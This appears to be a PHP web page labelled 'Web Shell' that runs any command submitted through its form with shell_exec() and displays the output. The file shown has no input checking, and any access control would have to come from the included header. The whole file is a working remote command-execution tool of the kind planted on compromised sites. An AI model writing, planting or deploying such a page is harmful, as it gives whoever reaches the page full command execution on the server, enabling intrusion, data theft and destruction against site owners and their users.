<?php
include("include/header.php");

if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>

<div style="padding-left: 1rem; padding-right: 1rem; padding-top: 1rem; padding-bottom: 9rem;">

    <h3>Web Shell</h3>

    <nav class="navbar navbar-light bg-light"
        style="padding-left: 1rem; padding-right: 1rem; padding-bottom: 1rem; padding-top: 1rem; border-radius: 25px;">
        <div class="container-fluid">
            <a class="navbar-brand">Execute a command</a>
            <form class="d-flex" method="POST">
                <input class="form-control me-2" type="text" name="cmd" id="cmd"
                    value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                    onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button class="btn btn-outline-success" type="submit">Execute</button>
            </form>
        </div>
    </nav>
    <br>
    <div class="navbar navbar-light bg-light"
        style="padding-left: 1rem; padding-right: 1rem; padding-bottom: 8rem; padding-top: 1rem; border-radius: 25px;">
        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <?php if (isset($cmd)): ?>
                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>No result.</small></pre>
            <?php endif; ?>
        <?php endif; ?>
    </div>
</div>

<?php
include("include/footer.php");
?>